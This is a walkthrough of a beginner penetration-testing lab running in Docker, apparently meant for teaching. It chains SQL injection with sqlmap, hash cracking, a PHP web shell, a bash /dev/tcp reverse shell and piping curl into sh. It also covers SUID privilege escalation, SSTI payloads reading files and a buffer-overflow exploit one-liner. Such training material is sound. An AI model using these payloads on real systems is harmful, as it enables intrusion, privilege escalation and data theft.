# Write Up: Most Basic Penetration Testing Labs (MBPTL)
==============
***Self-deployed straightforward hacking lab machine designed for newcomers who want to learn Penetration Testing, running inside Docker for easy setup.***

**Repository:** *https://github.com/bayufedra/MBPTL/*

**Author:** *Fedra Bayu*

> **Target IP:** 103.31.33.37

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Vulnerability Analysis](#vulnerability-analysis)
3. [Exploitation](#exploitation)
4. [Post-Exploitation](#post-exploitation)
5. [Pivoting](#pivoting)

## Prerequisites
Before starting this lab, ensure you have the following tools installed:
- Kali Linux or similar penetration testing distribution
- Basic knowledge of Linux command line
- Understanding of web application vulnerabilities

## Reconnaissance

### Port Scanning
Port scanning is the first step in any penetration test to identify open services. Nmap is the most commonly used tool due to its accuracy and comprehensive results. Alternatives include masscan, rustscan, and others.

#### Install Nmap
```bash
sudo apt install nmap
```

#### Basic Usage
```bash
nmap 103.31.33.37
```

#### Results
```
attacker@MBPTL:~$ nmap 103.31.33.37
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-01 00:00 WIB
Nmap scan report for ip-37-33-31-103.xxx-1337.mbptl.io (103.31.33.37)
Host is up (0.00073s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 4.76 seconds
```

**Analysis:** We discovered two HTTP services running on ports 80 and 8080, indicating web applications are accessible.

### Information Gathering
HTTP response headers often contain valuable information about the server configuration, technologies used, and potential vulnerabilities. We'll use `curl` to gather this information.

#### Install curl
```bash
sudo apt install curl
```

#### Basic Usage
We'll use the `-I` flag to retrieve only the response headers:
```bash
curl -I 103.31.33.37
```

#### Port 80 Results
```
❯ curl -I http://103.31.33.37/
HTTP/1.1 200 OK
Date: Thu, 07 Mar 2024 14:38:43 GMT
Server: Apache/2.4.52 (Debian)
X-Powered-By: PHP/7.3.33
Content-Type: text/html; charset=UTF-8
```

#### Port 8080 Results
```
❯ curl -I http://103.31.33.37:8080/
HTTP/1.1 200 OK
Date: Thu, 07 Mar 2024 14:39:31 GMT
Server: Apache/2.4.52 (Debian)
Last-Modified: Tue, 27 Feb 2024 14:40:33 GMT
ETag: "804-6125e02396e80"
Accept-Ranges: bytes
Content-Length: 2052
Vary: Accept-Encoding
Content-Type: text/html
```

**Analysis:** Both services run Apache 2.4.52 on Debian. Port 80 uses PHP 7.3.33, while port 8080 appears to serve static content.

### Directory Scanning
Since we found HTTP services, we can discover hidden directories and files using directory scanning tools. We'll use `dirsearch` as it's beginner-friendly and effective.

#### Install Python3 and Pip3
```bash
sudo apt install python3 python3-pip -y
```

#### Clone Dirsearch Repository
```bash
git clone https://github.com/maurosoria/dirsearch
```

#### Install Python Package Requirements
```bash
cd dirsearch
pip3 install -r requirements.txt
```

#### Basic Usage
```bash
❯ python3 dirsearch.py -u http://103.31.33.37/
```

#### Port 80 Results
```
❯ python3 dirsearch.py -u http://103.31.33.37/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11722

Output: /home/fedra/dirsearch/reports/http_103.31.33.37/__24-03-07_21-12-21.txt

Target: http://103.31.33.37/

[21:12:21] Starting:
[21:14:19] 301 -  314B  - /img  ->  http://103.31.33.37/img/
[21:14:19] 301 -  314B  - /inc  ->  http://103.31.33.37/inc/

Task Completed
```

#### Port 8080 Results
```bash
❯ python3 dirsearch.py -u http://103.31.33.37:8080/
```

```
❯ python3 dirsearch.py -u http://103.31.33.37:8080/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11722

Output: /home/fedra/dirsearch/reports/http_103.31.33.37_8080/__24-03-07_21-20-24.txt

Target: http://103.31.33.37:8080/

[21:20:24] Starting:
[21:21:26] 301 -  331B  - /administrator  ->  http://103.31.33.37:8080/administrator/
[21:21:26] 200 -    2KB - /administrator/
[21:21:26] 200 -    2KB - /administrator/index.php

Task Completed
```

**Analysis:** We discovered several interesting directories:
- Port 80: `/img` and `/inc` directories
- Port 8080: `/administrator` directory with an `index.php` file

## Vulnerability Analysis

After examining both web services, we found that port 8080 contains an administrator panel. However, the main vulnerability was discovered on port 80.

### SQL Injection Discovery
While exploring the web application on port 80, we noticed that clicking on items in the list changed the URL to `detail.php?id=1`. This parameter-based URL structure is a common indicator of potential SQL injection vulnerabilities.

**Testing for SQL Injection:**
When we added a single quote (`'`) to the URL parameter (`detail.php?id=1'`), the application returned an SQL error:

```
Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 1' at line 1
```

This error message confirms that the application is vulnerable to SQL injection, as it's directly concatenating user input into SQL queries without proper sanitization.

## Exploitation

### SQL Injection with SQLMap
We can exploit the SQL injection vulnerability using `sqlmap`, the most popular automated SQL injection tool. This tool can automatically detect and exploit various types of SQL injection vulnerabilities.

#### Clone SQLMap Repository
```bash
git clone https://github.com/sqlmapproject/sqlmap
cd sqlmap
```

#### Basic Usage
```bash
❯ python3 sqlmap.py -u <Vulnerable URL with Parameter>
```

#### Enumerating Databases
We'll use the `--dbs` flag to list all available databases:
```bash
python3 sqlmap.py -u 'http://103.31.33.37/detail.php?id=1' --dbs
```

**Results:**
```
[22:19:30] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.52, PHP 7.3.33
back-end DBMS: MySQL >= 5.6
[22:19:30] [INFO] fetching database names
available databases [6]:
[*] administrator
[*] bookstore
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

**Analysis:** The `administrator` database looks most promising for finding credentials.

#### Dumping the Administrator Database
```bash
python3 sqlmap.py -u 'http://103.31.33.37/detail.php?id=1' -D administrator --dump
```

**Results:**
```
Database: administrator
Table: users
[1 entry]
+----+----------------------------------+----------+
| id | password                         | username |
+----+----------------------------------+----------+
| 1  | b9f385c68320e27d5a4ea0618eef4a94 | admin    |
+----+----------------------------------+----------+
```

**Analysis:** We successfully extracted admin credentials from the database.

### Password Cracking
The password field contains a hash value. We can crack this hash using online hash cracking services or local tools.

**Hash Analysis:**
- Hash: `b9f385c68320e27d5a4ea0618eef4a94`
- Type: MD5 (32 characters, hexadecimal)
- Cracked Password: `P@assw0rd!`

**Method:** We used https://hashes.com/en/decrypt/hash to crack the MD5 hash.

### Accessing the Administrator Panel
Now that we have valid credentials (`admin:P@assw0rd!`), we can access the administrator panel discovered on port 8080.

**Login Details:**
- URL: `http://103.31.33.37:8080/administrator/`
- Username: `admin`
- Password: `P@assw0rd!`

### File Upload Vulnerability
After successfully logging into the administrator panel, we discovered a file upload feature. Since the application uses PHP as the backend, we can attempt to upload a malicious PHP file to gain command execution.

#### Creating a PHP Web Shell
Create a text file with the following content:
```php
<?php system($_GET["command"]); ?>
```

Save it with a `.php` extension (e.g., `shell.php`).

**Alternative Web Shell References:**
- https://github.com/bayufedra/Tiny-PHP-Webshell

#### Uploading the Shell
After uploading the file, the application responds with: `Book inserted successfully!`

#### Locating the Uploaded File
To find where the file was uploaded, we need to check the main website on port 80. By clicking "View Details" on any item and examining the broken image, we can right-click and "Open image in new tab" to see the file path.

**File Location Discovery:**
When accessing the uploaded file, we see:
```
Warning: system(): Cannot execute a blank command in /var/www/html/administrator/uploads/e77a53f1b6b4aba6d1fc86e42767ce4c.php on line 1
```

**Analysis:** The file is located at `/var/www/html/administrator/uploads/` with a randomly generated filename.

#### Command Execution
Now we can execute Linux commands by appending `?command=<command>` to the file URL:

**Example:**
```bash
http://103.31.33.37/administrator/uploads/e77a53f1b6b4aba6d1fc86e42767ce4c.php?command=ls -lah
```

**Results:**
```
total 16K
drwxrwxrwx 1 www-data www-data 4.0K Mar  7 15:32 .
drwxrwxr-x 1 root     root     4.0K Feb 27 14:40 ..
-rw-r--r-- 1 www-data www-data   34 Mar  7 15:32 e77a53f1b6b4aba6d1fc86e42767ce4c.php
-rwxrwxrwx 1 root     root     4.0K Feb 27 14:40 index.php
```

### Reading the User Flag
The flags are located in the `/flag` directory. Let's examine the directory structure:

```bash
ls -lah /flag
```

**Results:**
```
total 20K
drwxr-xr-x 1 root root 4.0K Feb 27 14:44 .
drwxr-xr-x 1 root root 4.0K Feb 27 14:46 ..
---------- 1 root root   40 Feb 27 14:40 root.txt
-rw-rw-r-- 1 root root   40 Feb 27 14:40 user.txt
```

**Reading the User Flag:**
```bash
cat /flag/user.txt
```

#### FLAG USER: USER{32250170a0dca92d53ec9624f336ca24}

**Note:** We cannot read the root flag yet as it has restrictive permissions (`----------`).

## Post-Exploitation

### Establishing a Reverse Shell
A reverse shell provides a more stable and interactive connection to the target system. It runs on the target but connects back to our attacking machine.

#### Install Netcat
```bash
sudo apt install nc -y
```

#### Setting Up a Listener
We'll use netcat to listen for incoming connections:
```bash
nc -lp 1337
```

#### Reverse Shell Payload
Create a new PHP file with the reverse shell payload:
```php
<?php system('bash -c "bash -i >& /dev/tcp/192.168.56.1/1337 0>&1"'); ?>
```

**Note:** Replace `192.168.56.1` with your actual attacking machine's IP address.

#### Establishing the Connection
After uploading and accessing the file, we receive a reverse shell connection:

```
❯ nc -lp 1337
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@63f5b77af313:/var/www/html/administrator/uploads$
```

### Privilege Escalation

#### Reconnaissance with LinPEAS
LinPEAS is a comprehensive privilege escalation enumeration script that searches for various paths to escalate privileges on Linux systems.

**Download and Run LinPEAS:**
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

**Source:** https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

#### Discovering the Vulnerability
LinPEAS revealed an interesting finding in the "SUID - Check easy privesc, exploits and write perms" section:
```
You can write SUID file: /bin/bahs
```

**Analysis:** There's a typo in the system - `/bin/bahs` instead of `/bin/bash`, and it has SUID permissions with root ownership.

#### Exploiting the SUID Binary
Since `/bin/bahs` is owned by root and has SUID permissions, executing it will run with root privileges:

```bash
bahs
```

This gives us a root shell, allowing us to access the root flag.

### Reading the Root Flag
```bash
bahs
cd /flag
cat root.txt
```

#### FLAG ROOT: ROOT{bed128365216c019988915ed3add75fb}

## Pivoting

After gaining root access to the main server, we can now pivot to access the internal network and discover other machines. Pivoting is a technique used to move from one compromised system to another system that is not directly accessible from the original attack vector.

### Network Discovery
From our root shell, let's discover what other systems are on the internal network:

```bash
# Check network interfaces
ip addr show

# Scan the internal network
nmap -sn 172.17.0.0/16
```

### Port Scanning Internal Hosts
We discovered that there's another container running on the internal network. Let's scan it for open ports:

```bash
# Scan the internal container (adjust IP as needed)
nmap -p- mbptl-app
```

### Accessing the Internal Service
The internal container is running a web service on port 1337. We can access it using various methods:

#### Method 1: Using curl from the compromised host
```bash
# From the root shell on the main container
curl http://mbptl-app:5000/
```

#### Method 2: Using wget
```bash
wget -qO- http://mbptl-app:5000/
```

#### Method 3: Using netcat
```bash
echo -e "GET / HTTP/1.1\r\nHost: mbptl-app:5000\r\n\r\n" | nc mbptl-app 1337
```

### Testing for Vulnerabilities
The internal service appears to be a simple Flask application. Let's test for common vulnerabilities:

```bash
# Test for command injection
curl "http://mbptl-app:5000/?name=test"
curl "http://mbptl-app:5000/?name=test';ls;'"
curl "http://mbptl-app:5000/?name=test%3Bcat%20/etc/passwd%3B"
```

### Exploiting the Internal Service
The internal service is vulnerable to Server-Side Template Injection (SSTI). We can exploit this to read files and execute commands:

```bash
# Read the flag file
curl "http://mbptl-app:5000/?name=\{\{config.items()\}\}"
curl "http://mbptl-app:5000/?name=\{\{request.application.__globals__.__builtins__.__import__('os').popen('cat+/flag.txt').read()\}\}"
```

### Alternative: Direct File Access
Since we have root access on the main container, we can also try to access the internal container's files directly through the Docker volume or by exploiting container escape techniques.

#### FLAG PIVOT: PIVOTING{b036ea40f13e3287b8e8babd5749e7cf}

## Internal Service Exploitation: mbptl-internal (Buffer Overflow)

After pivoting to the internal network, we discovered a service running on port 31337 inside the `mbptl-internal` container. This service is a custom C binary (`main`).

### Vulnerability Analysis
- The program uses `gets()` to read user input into a 128-byte buffer, making it vulnerable to a classic buffer overflow.
- There is a hidden function `__secret()` that spawns a shell with `system("/bin/bash")`.
- The binary is compiled with `-no-pie` and without stack protections, making it straightforward to exploit.

### Exploitation Steps
1. **Identify the Offset:**
   - The buffer is 128 bytes, plus 8 bytes for saved RBP, so the return address is at offset 136.
2. **Find Gadgets:**
   - The goal is to redirect execution to `__secret`. However, if stack alignment is required, a `ret` gadget may be needed.
   - In this case, the payload uses two addresses: a `ret` gadget at `0x401282` and the `__secret` function at `0x4011b6`.
3. **Craft the Payload:**
   - The payload consists of 136 bytes of padding, followed by the address of the `ret` gadget, then the address of `__secret`.

#### Exploit Payload
```bash
(python3 -c 'import struct, sys; sys.stdout.buffer.write(b"A"*136 + struct.pack("<Q", 0x401282) + struct.pack("<Q", 0x4011b6))'; cat -) | nc mbptl-internal 31337
```
- This command sends the overflow payload to the service, spawning a shell.

#### Reading the Flag
Once the shell is obtained, simply read the flag:
```bash
cat /flag.txt
```

**Flag:**
```
FLAG{c7e0cb7880fd168f41f25e24767660f6}
```

## Conclusion

This lab demonstrates a complete penetration testing methodology covering:
- **Reconnaissance:** Port scanning, information gathering, and directory enumeration
- **Vulnerability Analysis:** Manual testing for SQL injection
- **Exploitation:** Automated SQL injection with SQLMap, password cracking, and file upload exploitation
- **Post-Exploitation:** Reverse shell establishment and privilege escalation
- **Pivoting:** Internal network discovery and lateral movement

The lab showcases common web application vulnerabilities and demonstrates how they can be chained together to achieve full system compromise.

## Lessons Learned

1. **Input Validation:** Always validate and sanitize user input to prevent SQL injection
2. **File Upload Security:** Implement proper file type validation and storage security
3. **Privilege Management:** Avoid unnecessary SUID binaries and regularly audit system permissions
4. **Network Segmentation:** Proper network isolation can prevent lateral movement
5. **Defense in Depth:** Multiple layers of security controls are essential

## Tools Used

- **Nmap:** Port scanning and service enumeration
- **Dirsearch:** Directory and file enumeration
- **SQLMap:** Automated SQL injection exploitation
- **Netcat:** Reverse shell establishment and binary exploitation
- **LinPEAS:** Privilege escalation enumeration
- **Curl:** HTTP request testing and exploitation
- **Python3:** Buffer overflow payload creation
- **Struct module:** Binary data packing for exploit development
